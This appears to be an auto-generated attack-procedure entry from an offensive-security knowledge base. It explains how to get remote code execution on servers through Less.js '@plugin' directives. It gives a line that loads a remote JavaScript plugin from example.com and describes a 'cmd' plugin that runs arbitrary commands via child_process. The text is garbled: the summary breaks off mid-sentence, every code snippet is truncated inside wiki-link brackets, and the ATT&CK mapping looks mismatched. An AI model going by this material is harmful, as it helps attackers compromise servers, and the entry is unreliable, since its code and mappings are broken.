---
id: bc8096c2-4a74-4ec5-9d81-715c79b110fc
name: Server Side Template Injection with Less.js Plugins
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:40.042811+00:00'
updated_at: '2023-04-10T20:23:40.837534+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Template Injection|T1221 - Template Injection]]'
tags:
- '[[Lessjs]]'
- '[[Plugins]]'
- '[[Server Side Template Injection]]'
commands:
- '[[Import plugin from remote location]]'
---

# Server Side Template Injection with Less.js Plugins

## Summary

Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to execute arbitrary code on the server. This procedure focuses on exploiting SSTI in Less.js plugins. Less.js is a CSS preprocessor that allows for dynamic CSS styling. The plugins are third-party extensions that add 

## Description

# Description

Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to execute arbitrary code on the server. This procedure focuses on exploiting SSTI in Less.js plugins. Less.js is a CSS preprocessor that allows for dynamic CSS styling. The plugins are third-party extensions that add functionality to Less.js. By exploiting the SSTI vulnerability in these plugins, an attacker can execute arbitrary code on the server, leading to complete compromise of the system. This procedure is useful for attackers looking to gain access to sensitive data or perform further attacks on the compromised system. 

Technical Explanation: An attacker can exploit the SSTI vulnerability in the Less.js plugins by injecting malicious code into the plugin's template. This code will then be executed on the server, allowing the attacker to achieve remote code execution. 

Business Value: By exploiting this vulnerability, an attacker can gain access to sensitive data or perform further attacks on the compromised system. This can result in financial loss, damage to reputation, and legal repercussions.

## Requirements

1. Access to the target system

1. Knowledge of the SSTI vulnerability in Less.js plugins

1. Knowledge of the target system's configuration and installed plugins

## Defense

1. Regularly update and patch the software to prevent known vulnerabilities

1. Implement input validation and sanitization to prevent injection attacks

1. Monitor system logs for suspicious activity and implement intrusion detection and prevention measures

## Objectives

1. Exploit the SSTI vulnerability in Less.js plugins

1. Achieve remote code execution on the server

1. Gain access to sensitive data or perform further attacks on the compromised system

# Instructions

1. To remotely include a Less plugin, use the `@plugin` directive followed by the URL of the plugin file. The plugin file should contain valid Javascript code that will be executed during the Less transpilation process.

**Code**: [[// example local plugin usage
@plugin "plugin-2.7.]]

> The `@plugin` directive allows you to include external plugins in your Less code. These plugins are written in Javascript and can modify the Less transpilation process. When the Less compiler encounters a `@plugin` directive, it will download the specified plugin file, execute it, and make any necessary modifications to the Less transpilation process. This can be useful for adding custom functionality to Less, such as new functions or mixins.

2. Use this command to include a remote plugin in your LESS code.

**Code**: [[// example remote plugin usage
@plugin "http://exa]]

> The @plugin directive is used to include a remote plugin in your LESS code. The plugin must be hosted on a publicly accessible server and its URL must be provided as an argument to the directive. Once included, the plugin's functionality can be used in your LESS code. This command can be useful when you want to use a plugin that is not available locally or you want to use a specific version of a plugin that is not installed locally.

**Command** ([[Import plugin from remote location]]):

```bash
@plugin "http://example.com/plugin-2.7.js"
```

3. This plugin allows executing any command on the host machine remotely.

**Code**: [[functions.add('cmd', function(val) {
  return `"${]]

> The `cmd` function in the `data` field takes a `val` parameter which contains the command to be executed. The function uses the `child_process` module to execute the command passed to it via the `val` parameter. This plugin can be used to execute any command on the host machine remotely. Caution must be exercised while using this plugin as it can potentially harm the host machine if misused.

4. This plugin allows an attacker to execute arbitrary commands on the server running the vulnerable version of Less.js. The attacker can pass the command as an argument to the 'cmd' function.

**Code**: [[//Vulnerable plugin (3.13.1)
registerPlugin({
    ]]

> The plugin adds a new function 'cmd' to the Less.js environment. The function takes a single argument 'val' which is expected to be a string representing the command to be executed. The function then uses the 'child_process' module of Node.js to execute the command on the server and returns the output of the command as a string. This plugin can be used by an attacker to execute arbitrary commands on the server running the vulnerable version of Less.js.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Template Injection|T1221 - Template Injection]]

## Commands Used

- [[Import plugin from remote location]]

## Tags

- [[Lessjs]]
- [[Plugins]]
- [[Server Side Template Injection]]
